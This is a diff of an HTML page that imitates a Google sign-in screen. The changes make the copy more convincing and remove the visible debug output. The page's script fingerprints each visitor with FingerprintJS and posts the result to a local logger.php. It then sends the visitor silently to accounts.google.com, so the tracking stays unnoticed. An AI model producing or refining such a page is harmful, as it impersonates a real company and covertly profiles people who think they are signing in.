@@ -7,30 +7,64 @@
     <style>
         body {
             font-family: 'Google Sans', Roboto, Arial, sans-serif;
-            background: #fff;
+            background: #f9f9f9;
             margin: 0;
-            padding: 20px;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
         .login-container {
+            background: #fff;
             border: 1px solid #dadce0;
             border-radius: 8px;
-            padding: 40px;
+            padding: 48px 40px 36px;
             max-width: 450px;
+            width: 100%;
             text-align: center;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,.1);
         }
         .logo {
             font-size: 24px;
             font-weight: 400;
+            color: #5f6368;
+            margin-bottom: 16px;
+            font-family: 'Product Sans', Arial, sans-serif;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
             color: #202124;
-            margin-bottom: 20px;
+            margin: 16px 0 0;
+            padding: 0;
+        }
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 24px;
         }
         .loading {
             color: #1a73e8;
-            margin: 20px 0;
+            font-size: 14px;
+            margin: 24px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .spinner {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #1a73e8;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -38,26 +72,19 @@
     <div class="login-container">
         <div class="logo">Google</div>
         <h1>Sign in</h1>
-        <div class="loading">Verifying your account...</div>
-        <div id="debug" style="display:none; margin-top:20px; font-size:12px; color:#666;"></div>
+        <div class="subtitle">Use your Google Account</div>
+        <div class="loading">
+            <div class="spinner"></div>
+            Verifying your account...
+        </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <script>
-        function debug(message) {
-            console.log('Tracker Debug:', message);
-            const debugDiv = document.getElementById('debug');
-            debugDiv.style.display = 'block';
-            debugDiv.innerHTML += message + '<br>';
-        }
-
         ;(async () => {
             try {
-                debug('Loading FingerprintJS...');
                 const fp = await FingerprintJS.load();
-                debug('Getting fingerprint...');
                 const result = await fp.get();
-                debug('Fingerprint: ' + result.visitorId);
 
                 const payload = {
                     fingerprint: result.visitorId,
@@ -71,7 +98,6 @@
                     redirected: true
                 };
 
-                debug('Sending data to logger...');
                 const response = await fetch('./logger.php', {
                     method: 'POST',
                     headers: {
@@ -80,26 +106,16 @@
                     body: JSON.stringify(payload)
                 });
 
-                const responseText = await response.text();
-                debug('Logger response: ' + responseText);
-
-                if (response.ok) {
-                    debug('Success! Redirecting in 3 seconds...');
-                    setTimeout(() => {
-                        window.location.href = 'https://accounts.google.com/';
-                    }, 3000);
-                } else {
-                    debug('Error: ' + response.status);
-                    setTimeout(() => {
-                        window.location.href = 'https://accounts.google.com/';
-                    }, 5000);
-                }
-
-            } catch (e) {
-                debug('Exception: ' + e.message);
+                // Silent redirect after brief delay
                 setTimeout(() => {
                     window.location.href = 'https://accounts.google.com/';
-                }, 5000);
+                }, 2500);
+
+            } catch (e) {
+                // Silent redirect on error
+                setTimeout(() => {
+                    window.location.href = 'https://accounts.google.com/';
+                }, 3000);
             }
         })();
     </script>
